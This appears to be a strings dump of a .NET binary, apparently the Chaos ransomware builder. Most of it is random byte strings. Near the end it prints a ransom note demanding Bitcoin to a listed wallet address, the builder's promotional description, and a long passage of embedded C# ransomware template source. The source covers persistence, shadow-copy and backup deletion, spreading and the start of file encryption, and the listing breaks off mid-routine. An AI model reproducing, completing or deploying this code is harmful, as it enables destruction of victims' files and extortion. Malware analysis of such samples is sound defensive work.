Metadata Signature: 0x6fe8 0x10001424a5342 12
.NET Version: v4.0.30319
Number of Metadata Streams: 5
DirectoryAddress: 6c Size: 25ec
Stream name: #~ 4
DirectoryAddress: 2658 Size: 24f8
Stream name: #Strings 12
DirectoryAddress: 4b50 Size: 1628
Stream name: #US 4
DirectoryAddress: 6178 Size: 10
Stream name: #GUID 8
DirectoryAddress: 6188 Size: 850
Stream name: #Blob 8
[Strings]
nth  paddr      vaddr      len  size section type    string
1021 0x00010735 0x00412535 8    10   .text   utf8    o9!z\rNĥV blocks=Basic Latin,Latin Extended-A
1022 0x00010764 0x00412564 5    6    .text   ascii   mk#U(
1023 0x00010858 0x00412658 4    5    .text   ascii   <5Gu
1024 0x00010871 0x00412671 5    6    .text   ascii   77;_h
1025 0x000108e2 0x004126e2 5    6    .text   ascii   v4h#$
1026 0x000108f2 0x004126f2 4    5    .text   ascii   9Aqn
1027 0x00010907 0x00412707 4    5    .text   ascii   T(-,
1028 0x00010928 0x00412728 5    6    .text   ascii   \rk\a|6
1029 0x0001096c 0x0041276c 6    8    .text   utf8    iIŅef. blocks=Basic Latin,Latin Extended-A
1030 0x000109b0 0x004127b0 5    6    .text   ascii   {?ny\
1031 0x000109fc 0x004127fc 4    6    .text   utf8    %=нa blocks=Basic Latin,Cyrillic
1032 0x00010a18 0x00412818 4    5    .text   ascii   Y3#}
1033 0x00010a26 0x00412826 4    6    .text   utf8    Rێ}? blocks=Basic Latin,Arabic
1034 0x00010a33 0x00412833 4    6    .text   utf8    9Jױa blocks=Basic Latin,Hebrew
1035 0x00010a84 0x00412884 4    7    .text   utf8    Dîιk blocks=Basic Latin,Latin-1 Supplement,Greek and Coptic
1036 0x00010aa7 0x004128a7 4    5    .text   ascii   P"?=
1037 0x00010ae6 0x004128e6 4    7    .text   utf8    +9> blocks=Basic Latin,Private Use Area
1038 0x00010b1c 0x0041291c 5    6    .text   ascii   Iidjb
1039 0x00010b38 0x00412938 5    6    .text   ascii   Z,oZ_
1040 0x00010b58 0x00412958 11   14   .text   utf8    3\v,ݙ&?=߲>_, blocks=Basic Latin,Arabic Supplement,NKo
1041 0x00010b77 0x00412977 4    5    .text   ascii   QH9k
1042 0x00010ba1 0x004129a1 4    5    .text   ascii   Z#79
1043 0x00010bac 0x004129ac 4    6    .text   utf8    $ưi~ blocks=Basic Latin,Latin Extended-B
1044 0x00010be9 0x004129e9 4    5    .text   ascii   \f>~r
1045 0x00010bef 0x004129ef 4    5    .text   ascii   V\vEn
1046 0x00010c42 0x00412a42 4    5    .text   ascii   q".K
1047 0x00010c56 0x00412a56 4    5    .text   ascii   ~Laf
1048 0x00010c95 0x00412a95 7    8    .text   ascii   }bT&-\a-
1049 0x00010d26 0x00412b26 4    6    .text   utf8    &֑$3 blocks=Basic Latin,Hebrew
1050 0x00010d69 0x00412b69 4    6    .text   utf8    s]|ߗ blocks=Basic Latin,NKo
1051 0x00010da5 0x00412ba5 8    9    .text   ascii   \bsWooyh'
1052 0x00010e1e 0x00412c1e 4    5    .text   ascii   F]zO
1053 0x00010e41 0x00412c41 4    5    .text   ascii   X:I<
1054 0x00010e99 0x00412c99 5    7    .text   utf8    R(6-̙ blocks=Basic Latin,Combining Diacritical Marks
1055 0x00010ea3 0x00412ca3 4    5    .text   ascii   S/0{
1056 0x00010ec1 0x00412cc1 4    5    .text   ascii   (Np?
1057 0x00010f5e 0x00412d5e 4    6    .text   utf8    K'Ɍ\f blocks=Basic Latin,Latin Extended-B
1058 0x00010f64 0x00412d64 8    10   .text   utf8    UkԊ%JKyq blocks=Basic Latin,Cyrillic Supplement
1059 0x00010f72 0x00412d72 6    9    .text   utf8    A\a隮#C" blocks=Basic Latin,CJK Unified Ideographs
1060 0x00010f7d 0x00412d7d 7    9    .text   utf8    PZX&?5ˏ blocks=Basic Latin,Spacing Modifier Letters
1061 0x00010fe3 0x00412de3 5    6    .text   ascii   \f='FI
1062 0x00010fed 0x00412ded 5    8    .text   utf8    'פ<uĥ blocks=Basic Latin,Hebrew,Latin Extended-A
1063 0x0001102e 0x00412e2e 5    7    .text   utf8    Yܲqe5 blocks=Basic Latin,Syriac
1064 0x00011047 0x00412e47 8    9    .text   ascii   3\f>{CO>B
1065 0x00011053 0x00412e53 4    5    .text   ascii   \a{)/
1066 0x000110a1 0x00412ea1 5    6    .text   ascii   '%E\eD
1067 0x000110ba 0x00412eba 7    8    .text   ascii   `\fsWo1u
1068 0x000110e0 0x00412ee0 4    5    .text   ascii   L_PW
1069 0x00011118 0x00412f18 4    5    .text   ascii   v@+2
1070 0x00011160 0x00412f60 4    5    .text   ascii   <GHj
1071 0x000111e5 0x00412fe5 4    5    .text   ascii   UQGZ
1072 0x0001123d 0x0041303d 4    5    .text   ascii   _X\tT
1073 0x000112b2 0x004130b2 7    9    .text   utf8    7_#֑"{x blocks=Basic Latin,Hebrew
1074 0x00011304 0x00413104 6    8    .text   utf8    ,ݺK9W` blocks=Basic Latin,Arabic Supplement
1075 0x0001131a 0x0041311a 6    8    .text   utf8    ɘF#R}] blocks=IPA Extensions,Basic Latin
1076 0x00011324 0x00413124 5    6    .text   ascii   E2#}$
1077 0x00011342 0x00413142 4    6    .text   utf8    }lDʆ blocks=Basic Latin,IPA Extensions
1078 0x000113ac 0x004131ac 5    7    .text   utf8    Z,SZȵ blocks=Basic Latin,Latin Extended-B
1079 0x000113c4 0x004131c4 4    5    .text   ascii   ?Oaf
1080 0x000113e0 0x004131e0 4    5    .text   ascii   Ei1G
1081 0x000113fd 0x004131fd 4    5    .text   ascii   N,J4
1082 0x0001144a 0x0041324a 9    11   .text   utf8    .H\n7_$75ߚ blocks=Basic Latin,NKo
1083 0x00011488 0x00413288 5    6    .text   ascii   \b4\n9O
1084 0x00011513 0x00413313 5    6    .text   ascii   jas+_
1085 0x0001159d 0x0041339d 4    5    .text   ascii   ?C\vp
1086 0x000115c8 0x004133c8 8    9    .text   ascii   I \nfXiG\a
1087 0x0001160a 0x0041340a 6    7    .text   ascii    yFE08
1088 0x00011649 0x00413449 4    6    .text   utf8    %`Qڏ blocks=Basic Latin,Arabic
1089 0x00011670 0x00413470 5    6    .text   ascii   Z,{B8
1090 0x00011765 0x00413565 4    5    .text   ascii   wL \e
1091 0x000117c9 0x004135c9 7    8    .text   ascii   .#\r@ma'
1092 0x000117f6 0x004135f6 9    11   .text   utf8    ҟlg\bZ,mC& blocks=Cyrillic,Basic Latin
1093 0x000118c6 0x004136c6 4    6    .text   utf8    Ų3B\a blocks=Latin Extended-A,Basic Latin
1094 0x00011902 0x00413702 4    6    .text   utf8    ڷXZc blocks=Arabic,Basic Latin
1095 0x00011932 0x00413732 5    6    .text   ascii   4RlWl
1096 0x00011a28 0x00413828 4    5    .text   ascii   ^-\bo
1097 0x00011b18 0x00413918 5    7    .text   utf8    H#JAǀ blocks=Basic Latin,Latin Extended-B
1098 0x00011b56 0x00413956 6    7    .text   ascii   Q\netP\e
1099 0x00011ba9 0x004139a9 4    5    .text   ascii   \r\DT
1100 0x00011bbf 0x004139bf 4    5    .text   ascii   4JiL
1101 0x00011bc5 0x004139c5 4    5    .text   ascii   Htp?
1102 0x00011bcb 0x004139cb 4    6    .text   utf8    ŲsV\e blocks=Latin Extended-A,Basic Latin
1103 0x00011be1 0x004139e1 5    8    .text   utf8    L؟զV} blocks=Basic Latin,Arabic,Armenian
1104 0x00011bf6 0x004139f6 5    6    .text   ascii   -\b_b=
1105 0x00011c1c 0x00413a1c 5    7    .text   utf8    \f"O8\n
1106 0x00011c31 0x00413a31 4    5    .text   ascii   \tj{|
1107 0x00011c5a 0x00413a5a 4    5    .text   ascii   6]h9
1108 0x00011c7d 0x00413a7d 5    7    .text   utf8    @ܣ\t$S blocks=Basic Latin,Syriac
1109 0x00011cc2 0x00413ac2 4    5    .text   ascii   \tD\r*
1110 0x00011cf5 0x00413af5 4    5    .text   ascii   s\a-{
1111 0x00011d1c 0x00413b1c 5    6    .text   ascii   m,0U.
1112 0x00011dc8 0x00413bc8 6    7    .text   ascii   c6.`i\e
1113 0x00011df6 0x00413bf6 5    6    .text   ascii   uPZi'
1114 0x00011dfc 0x00413bfc 4    5    .text   ascii   gv[`
1115 0x00011e1c 0x00413c1c 4    5    .text   ascii   `3jH
1116 0x00011e38 0x00413c38 4    5    .text   ascii   15?h
1117 0x00011e93 0x00413c93 4    6    .text   utf8    ҮVJ) blocks=Cyrillic,Basic Latin
1118 0x00011ed9 0x00413cd9 4    5    .text   ascii   Y6%|
1119 0x00011ef3 0x00413cf3 4    5    .text   ascii   A\\t?
1120 0x00011efe 0x00413cfe 4    5    .text   ascii   Jk-^
1121 0x00011f81 0x00413d81 4    5    .text   ascii   /~x0
1122 0x000120cf 0x00413ecf 4    6    .text   utf8    \td"ϛ blocks=Basic Latin,Greek and Coptic
1123 0x000120de 0x00413ede 4    5    .text   ascii   YH"Y
1124 0x0001211d 0x00413f1d 4    6    .text   utf8    7(}ϲ blocks=Basic Latin,Greek and Coptic
1125 0x00012162 0x00413f62 4    5    .text   ascii   hv-#
1126 0x00012187 0x00413f87 4    5    .text   ascii   oV\vw
1127 0x000121bb 0x00413fbb 4    5    .text   ascii   \aL\rc
1128 0x000121e0 0x00413fe0 8    9    .text   ascii   \ec\fJim;\v
1129 0x000121ee 0x00413fee 4    6    .text   utf8    ^_Xӏ blocks=Basic Latin,Cyrillic
1130 0x00012201 0x00414001 7    10   .text   utf8    \v짵9\`\b) blocks=Basic Latin,Hangul Syllables
1131 0x00012296 0x00414096 4    5    .text   ascii   {?bc
1132 0x000122d6 0x004140d6 4    6    .text   utf8    aRiǩ blocks=Basic Latin,Latin Extended-B
1133 0x00012419 0x00414219 4    5    .text   ascii   IEND
1134 0x00021ef0 0x00423cf0 16   68   .text   utf32le \e-.......y|{{{{{
1135 0x00022ee8 0x00424ce8 13   56   .text   utf32le [ZZZZ[[[[VVVU
1136 0x00026fcc 0x00428dcc 4    20   .text   utf32le \r\r\r\n
1137 0x0002922c 0x0042b02c 11   48   .text   utf32le \e ++29ĹĽŀ@3 blocks=Basic Latin,Latin Extended-A
1138 0x0002a92c 0x0042c72c 963  964  .text   ascii   \a----> Chaos is multi language ransomware. Translate your note to any language <----\r\nAll of your files have been encrypted\r\nYour computer was infected with a ransomware virus. Your files have been encrypted and you won't \r\nbe able to decrypt them without our help.What can I do to get my files back?You can buy our special \r\ndecryption software, this software will allow you to recover all of your data and remove the\r\nransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.\r\nHow do I pay, where do I get Bitcoin?\r\nPurchasing Bitcoin varies from country to country, you are best advised to do a quick google search\r\nyourself  to find out how to buy Bitcoin. \r\nMany of our customers have reported these sites to be fast and reliable:\r\nCoinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com\r\n\r\nPayment informationAmount: 0.1473766 BTC\r\nBitcoin Address:  bc1qlnzcep4l4ac0ttdrq7awxev9ehu465f2vpt9x0\r\n
1139 0x0002ad00 0x0042cb00 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1140 0x0002ad9d 0x0042cb9d 8    9    .text   ascii   PADPADPA
1141 0x0002adb1 0x0042cbb1 11   24   .text   utf16le label1.Text
1142 0x0002adce 0x0042cbce 568  569  .text   ascii   Chaos is multi language ransomware which \r\nmeans you can translate your note to any\r\n language. This Ransoware encrypts all files \r\nand drops a note for every folder in which files have \r\nbeen encrypted. You can overwrite all files or encrypt \r\nthem with aes/rsa encryption method. Create \r\nyour decrypter using the advanced option. \r\nPublic and private keys will be created automatically. \r\nKeep private key and decrypter. Without them files \r\ncannot be returned.\r\nThis project depends on your donation. \r\nPlease donete if you want to see next\r\nreleases in the future
1143 0x0002b018 0x0042ce18 145  146  .text   ascii   lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
1144 0x0002b0b5 0x0042ceb5 7    8    .text   ascii   PADPADP
1145 0x0002b0d1 0x0042ced1 6    14   .text   utf16le Source
1146 0x0002b0e2 0x0042cee2 9    19   .text   utf16le decrypter
1147 0x0002b0fc 0x0042cefc 1952 1953 .text   ascii   using System;\r\nusing System.Linq;\r\nusing System.Windows.Forms;\r\nusing System.Runtime.InteropServices;\r\nusing System.Text.RegularExpressions;\r\n\r\nnamespace ConsoleApplication7\r\n{\r\n    class Program\r\n    {\r\n        private static string userName = Environment.UserName;\r\n        private static string userDir = "C:\\Users\\";\r\n        public static string appMutexRun = "7z459ajrk722yn8c5j4fg";\r\n        public static bool encryptionAesRsa = #encryptOption;\r\n        public static string encryptedFileExtension = "#encryptedFileExtension";\r\n        private static bool checkSpread = #checkSpread;\r\n        private static string spreadName = "#spreadName";\r\n        private static bool checkCopyRoaming = #copyRoaming;\r\n        private static string processName = "#exeName";\r\n        private static bool checkStartupFolder = #startupFolder;\r\n        private static bool checkSleep = #checkSleep;\r\n        private static int sleepTextbox = #sleepTextbox;\r\n        public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";\r\n        private static string droppedMessageTextbox = "#droppedMessageTextbox";\r\n        //************ Admin field **********\r\n        private static bool checkAdminPrivilage = #adminPrivilage;\r\n        private static bool checkdeleteShadowCopies = #checkdeleteShadowCopies;\r\n        private static bool checkdisableRecoveryMode = #checkdisableRecoveryMode;\r\n        private static bool checkdeleteBackupCatalog = #checkdeleteBackupCatalog;\r\n        //*****************\r\n        public static string staticSplit = "bc";\r\n        public static string appMutex = staticSplit+appMutexStartup + appMutexRun;\r\n        public readonly static Regex appMutexRegex = new Regex(@"(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");\r\n        private static string[] messages = { \r\n                                #messages\r\n                            };\r\n        private static string[] validExtensions = new[]\r\n                {
1148 0x0002b89d 0x0042d69d 2017 2017 .text   ascii   \n                        ".txt",".jar",".dat",".contact",".settings",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".odt",".jpg",".mka",".mhtml",".oqy",\r\n                        ".png",".csv",".py",".sql",".mdb",".php",".asp",".aspx",".html",".htm",".xml",".psd",".pdf",".xla",".cub",".dae",".indd",\r\n                        ".cs",".mp3",".mp4",".dwg",".zip",".rar",".mov",".rtf",".bmp",".mkv",".avi",".apk",".lnk",".dib",".dic",".dif",".divx",\r\n                        ".iso",".7-zip",".ace",".arj",".bz2",".cab",".gzip",".lzh",".tar",".jpeg",".xz",".mpeg",".torrent",".mpg",\r\n                        ".core",".pdb",".ico",".pas",".db",".wmv",".swf",".cer",".bak",".backup",".accdb",".bay",".p7c",".exif",".vss",".raw",\r\n                        ".m4a",".wma",".flv",".sie",".sum",".ibank",".wallet",".css",".js",".rb",".crt",".xlsm",".xlsb",".7z",".cpp",".java",".jpe",".ini",\r\n                        ".blob",".wps",".docm",".wav",".3gp",".webm",".m4v",".amv",".m4p",".svg",".ods",".bk",".vdi",".vmdk",".onepkg",".accde",\r\n                        ".jsp",".json",".gif",".log",".gz",".config",".vb",".m1v",".sln",".pst",".obj",".xlam",".djvu",".inc",".cvs",".dbf",".tbi",\r\n                        ".wpd",".dot",".dotx",".xltx",".pptm",".potx",".potm",".pot",".xlw",".xps",".xsd",".xsf",".xsl",".kmz",".accdr",".stm",\r\n                        ".accdt",".ppam",".pps",".ppsm",".1cd",".3ds",".3fr",".3g2",".accda",".accdc",".accdw",".adp",".ai",".ai3",\r\n                        ".ai4",".ai5",".ai6",".ai7",".ai8",".arw",".ascx",".asm",".asmx",".avs",".bin",".cfm",".dbx",".dcm",".dcr",".pict",".rgbe",\r\n                        ".dwt",".f4v",".exr",".kwm",".max",".mda",".mde",".mdf",".mdw",".mht",".mpv",".msg",".myi",".nef",".odc",".geo",".swift",\r\n                        ".odm",".odp",".oft",".orf",".pfx",".p12",".pl",".pls",".safe",".tab",".vbs",".xlk",".xlm",".xlt",".xltm",".svgz",".slk",\r\n                        ".tar.gz",".dmg",".ps",".psb",".tif",".rss",".key",".vob",".epsp",".dc3",".iff",".onepkg",".onetoc2
1149 0x0002c07e 0x0042de7e 1899 1900 .text   ascii   ",".opt",".p7b",".pam",".r3d"\r\n\r\n                };\r\n        public static class NativeMethods\r\n        {\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            [return: MarshalAs(UnmanagedType.Bool)]\r\n            public static extern bool AddClipboardFormatListener(IntPtr hwnd);\r\n\r\n            [DllImport("user32.dll", SetLastError = true)]\r\n            public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);\r\n\r\n            public const int clp = 0x031D;\r\n            public static IntPtr intpreclp = new IntPtr(-3);\r\n        }\r\n        static void Main(string[] args)\r\n        {\r\n            if (AlreadyRunning())\r\n            {\r\n                System.Environment.Exit(1);\r\n            }\r\n            if (checkSleep)\r\n            {\r\n                sleepOutOfTempFolder();\r\n                //System.Threading.Thread.Sleep(sleepTextbox * 1000);\r\n            }\r\n            if (checkAdminPrivilage)\r\n            {\r\n                copyResistForAdmin(processName);\r\n            }\r\n            else\r\n            {\r\n                if (checkCopyRoaming)\r\n                {\r\n                    copyRoaming(processName);\r\n                }\r\n            }\r\n            if (checkStartupFolder)\r\n            {\r\n                addLinkToStartup();\r\n            }\r\n\r\n\r\n            lookForDirectories();\r\n\r\n            if (checkAdminPrivilage)\r\n            {\r\n                if (checkdeleteShadowCopies)\r\n                {\r\n                    deleteShadowCopies();\r\n                }\r\n                if (checkdisableRecoveryMode)\r\n                {\r\n                    disableRecoveryMode();\r\n                }\r\n                if (checkdeleteBackupCatalog)\r\n                {\r\n                    deleteBackupCatalog();\r\n                }\r\n            }\r\n            if (checkSpread == true)\r\n            {\r\n                spreadIt(spreadName);\r\n            }
1150 0x0002c7ea 0x0042e5ea 1939 1939 .text   ascii   \n            addAndOpenNote();\r\n            new System.Threading.Thread(() => { Run(); }).Start();\r\n        }\r\n\r\n        public static void Run()\r\n        {\r\n            Application.Run(new driveNotification.NotificationForm());\r\n        }\r\n        private static void sleepOutOfTempFolder()\r\n        {\r\n\r\n            string currentPath = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);\r\n            string tempFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);\r\n            if (currentPath != tempFolder)\r\n            {\r\n                System.Threading.Thread.Sleep(sleepTextbox * 1000);\r\n            }\r\n        }\r\n        private static bool AlreadyRunning()\r\n        {\r\n            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();\r\n            System.Diagnostics.Process currentProc = System.Diagnostics.Process.GetCurrentProcess();\r\n\r\n            foreach (System.Diagnostics.Process process in processes)\r\n            {\r\n                try\r\n                {\r\n                    if (process.Modules[0].FileName == System.Reflection.Assembly.GetExecutingAssembly().Location\r\n                                && currentProc.Id != process.Id)\r\n                        return true;\r\n                }\r\n                catch (Exception)\r\n                {\r\n\r\n                }\r\n            }\r\n\r\n            return false;\r\n        }\r\n\r\n        public static byte[] random_bytes(int length)\r\n        {\r\n            Random rnd = new Random();\r\n            length = length + 1;\r\n            byte[] random = new byte[length];\r\n            rnd.NextBytes(random);\r\n            return random;\r\n        }\r\n        private static Random random = new Random();\r\n        public static string RandomString(int length)\r\n        {\r\n            const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";\r\n            var builder = new System.Text.St
1151 0x0002cf7d 0x0042ed7d 1938 1938 .text   ascii   ringBuilder();\r\n\r\n            for (var i = 0; i < length; i++)\r\n            {\r\n                var c = pool[random.Next(0, pool.Length)];\r\n                builder.Append(c);\r\n            }\r\n\r\n            return builder.ToString();\r\n        }\r\n        public static string RandomStringForExtension(int length)\r\n        {\r\n            if (encryptedFileExtension == "")\r\n            {\r\n                const string pool = "abcdefghijklmnopqrstuvwxyz0123456789";\r\n                var builder = new System.Text.StringBuilder();\r\n\r\n                for (var i = 0; i < length; i++)\r\n                {\r\n                    var c = pool[random.Next(0, pool.Length)];\r\n                    builder.Append(c);\r\n                }\r\n\r\n                return builder.ToString();\r\n            }\r\n            else\r\n            {\r\n                return encryptedFileExtension;\r\n            }\r\n\r\n        }\r\n        public static string Base64EncodeString(string plainText)\r\n        {\r\n            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);\r\n            return System.Convert.ToBase64String(plainTextBytes);\r\n        }\r\n        public static string randomEncode(string plainText)\r\n        {\r\n            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);\r\n            return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + System.Convert.ToBase64String(plainTextBytes);\r\n        }\r\n        private static void encryptDirectory(string location)\r\n        {\r\n\r\n            try\r\n            {\r\n                string[] files = System.IO.Directory.GetFiles(location);\r\n                bool checkCrypted = true;\r\n                for (int i = 0; i < files.Length; i++)\r\n                {\r\n                    try\r\n                    {\r\n                        string extension = System.IO.Path.GetExtension(files[i]);\r\n                        string fileName = System.IO.Path.
